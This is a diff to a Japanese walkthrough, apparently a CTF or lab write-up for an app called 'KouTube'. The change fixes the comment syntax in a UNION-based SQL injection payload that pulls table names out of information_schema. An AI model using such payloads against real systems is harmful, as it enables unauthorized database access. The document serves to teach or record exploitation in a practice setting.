@@ -19,7 +19,7 @@
 次に以下のペイロードを使用してテーブル名を取得：
 
 ```sql
-' AND 1=2 UNION SELECT 1, 2, table_name, 'dummy_description', 'dummy_filepath.mp4', 5, '2025-01-01 00:00:00' FROM information_schema.tables WHERE table_schema = 'KouTube' --'
+' AND 1=2 UNION SELECT 1, 2, table_name, 'dummy_description', 'dummy_filepath.mp4', 5, '2025-01-01 00:00:00' FROM information_schema.tables WHERE table_schema = 'KouTube' -- '
 ```
 
 **期待される結果**: データベース内のテーブル名一覧が表示される
